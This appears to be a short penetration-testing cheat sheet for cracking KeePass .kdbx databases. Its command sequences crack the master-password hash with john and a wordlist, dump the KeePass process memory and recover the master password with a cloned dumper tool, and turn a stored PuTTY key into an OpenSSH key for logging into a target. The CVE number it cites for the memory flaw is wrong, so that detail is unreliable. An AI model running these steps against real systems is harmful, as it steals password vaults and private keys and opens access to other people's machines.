# KeePass (.kdbx) Cracking

```bash
keepass2john <file>.kdbx > kdbx.hash
john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash
# then open the .kdbx with the cracked master password
```

## CVE-2022-32784 — Master Password Recovery from Memory Dump

If the KeePass process is running, dump its memory and recover the master password (all but the first character).

```bash
# Get process dump (Windows):
# Task Manager → KeePass → Create dump file
# Or:
procdump.exe -ma <PID> KeePassDumpFull.dmp

# Run keepass-password-dumper (needs .NET 7):
git clone https://github.com/vdohney/keepass-password-dumper
cd keepass-password-dumper
dotnet run /path/to/KeePassDumpFull.dmp
# Output: ●dgrød med fløde  (first char unknown, rest recoverable)
```

Docker if no .NET 7 on system:
```bash
docker run --rm -it -v $(pwd):/data mcr.microsoft.com/dotnet/sdk:7.0.100
# Inside container:
git clone https://github.com/vdohney/keepass-password-dumper
cd keepass-password-dumper
dotnet run /data/KeePassDumpFull.dmp
```

## Use PuTTY Key from KeePass Entry

```bash
# Export the .ppk attachment from KeePass, then convert:
sudo apt install putty-tools
puttygen <key>.ppk -O private-openssh -o id_rsa
ssh -i id_rsa <user>@<TARGET>
```

